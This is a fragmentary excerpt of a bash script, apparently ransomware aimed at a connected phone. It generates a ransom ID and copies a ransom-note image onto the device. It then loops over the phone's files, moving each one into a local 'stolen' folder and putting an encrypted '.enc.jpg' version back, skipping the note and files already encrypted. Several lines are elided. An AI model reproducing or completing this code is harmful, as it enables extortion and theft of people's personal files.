...
#drop ransom note
ransomid=$(openssl rand -hex 16)
echo "Dropping note..."
gio copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png"
...
do 
	...
	if [[ $f != "ransom"* ]] && [[ $f != *".enc.jpg" ]]; then #encrypt all files that are not already encrypted nor the ransom note file
		...
		gio move "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
		...
		gio move "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" .	
